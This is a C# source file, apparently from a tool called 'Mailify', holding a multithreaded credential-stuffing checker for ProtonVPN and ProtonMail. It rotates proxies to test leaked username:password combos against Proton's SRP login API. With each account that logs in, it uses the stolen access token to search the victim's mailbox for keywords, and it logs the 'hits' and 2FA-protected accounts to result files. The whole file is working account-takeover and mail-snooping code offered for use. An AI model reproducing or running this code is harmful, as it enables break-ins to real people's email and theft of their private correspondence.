using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;
using ProtonPlugin;
using Newtonsoft.Json;

namespace Mailify
{
    internal class ProtonMail_Scan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    req.AddHeader("Host", "account.protonvpn.com");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0");
                    req.AddHeader("Accept", "application/vnd.protonmail.v1+json");
                    req.AddHeader("Referer", "https://account.protonvpn.com/login");
                    req.AddHeader("x-pm-appversion", "WebVPNSettings_4.1.28");
                    req.AddHeader("x-pm-apiversion", "3");
                    Dictionary<string, string> Postdata = new Dictionary<string, string>
            {
                { "Username", credentials[0] }
            };
                    string check = req.Post("https://account.protonvpn.com/api/auth/info", JsonConvert.SerializeObject(Postdata, Formatting.None), "application/json").ToString();

                    if (check.Contains(":\"Invalid username\""))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }

                    var SALT = Functions.JSON(check, "Salt").FirstOrDefault();
                    var MODULUS = Functions.JSON(check, "Modulus").FirstOrDefault();
                    var ServerEphemeral = Functions.JSON(check, "ServerEphemeral").FirstOrDefault();
                    var SRPSession = Functions.JSON(check, "SRPSession").FirstOrDefault();

                    ProtonDataHash.Process(SALT, MODULUS, credentials[0], credentials[1], ServerEphemeral);

                    req.AddHeader("Host", "account.protonvpn.com");
                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0");
                    req.AddHeader("Accept", "application/vnd.protonmail.v1+json");
                    req.AddHeader("Referer", "https://account.protonvpn.com/login");
                    req.AddHeader("x-pm-appversion", "WebVPNSettings_4.1.28");
                    req.AddHeader("x-pm-apiversion", "3");
                    Dictionary<string, string> PostData = new Dictionary<string, string>
            {
                { "ClientProof", ProtonDataHash.fucker2 },
                { "ClientEphemeral",ProtonDataHash.fucker },
                { "SRPSession", SRPSession },
                { "Username", credentials[0] }
            };
                    var resp = req.Post("https://account.protonvpn.com/api/auth", JsonConvert.SerializeObject(PostData, Formatting.Indented), "application/json").ToString();

                    if (resp.Contains("\"Incorrect login credentials. Please try again\"") || resp.Contains("Incorrect login credentials"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else if (resp.Contains("\"AccessToken\":\"") || resp.Contains("\"Uid\":\"") || resp.Contains("\"UID\":"))
                    {
                        var UID = Functions.JSON(resp, "UID").FirstOrDefault();
                        var AT = Functions.JSON(resp, "AccessToken").FirstOrDefault();

                        try
                        {
                            foreach (string keyword in File.ReadAllLines("Files//Keywords.txt"))
                            {
                                req.AddHeader("Pragma", "no-cache");
                                req.AddHeader("Referer", "https://mail.protonmail.com/login");
                                req.AddHeader("Sec-Fetch-Dest", "empty");
                                req.AddHeader("Sec-Fetch-Mode", "cors");
                                req.AddHeader("Sec-Fetch-Site", "same-origin");
                                req.AddHeader("Sec-GPC", "1");
                                req.AddHeader("Authorization", "Bearer " + AT + "");
                                req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");
                                req.AddHeader("x-pm-apiversion", "3");
                                req.AddHeader("x-pm-appversion", "Web_3.16.60");
                                req.AddHeader("x-pm-uid", "" + UID + "");

                                var res0 = req.Get("https://mail.protonmail.com/api/messages?AutoWildcard=0&Keyword=" + keyword + "&Limit=100&Page=0");
                                string text0 = res0.ToString();

                                var totalCount = Functions.LR(text0, ",\"Total\":", ",\"").FirstOrDefault();

                                if (totalCount == null || totalCount == "0")
                                {
                                    Variables.Custom++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                    }
                                }
                                else
                                {
                                    Variables.Valid++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] " + combo + " | Keyword: " + keyword + " | Results: " + totalCount, Color.Green);
                                        }
                                        File.AppendAllText(Variables.results + $"{keyword}.txt", combo + " | Keyword: " + keyword + " | Results: " + totalCount + Environment.NewLine);
                                    }
                                }
                            }
                        }
                        catch
                        {

                            Variables.Custom++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                            }
                        }
                    }
                    else if (resp.Contains("\"2FA\":{\"Enabled\":1") || resp.Contains("\"TwoFactor\":1") || resp.Contains("\"TOTP\":1"))
                    {
                        Variables.Custom++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}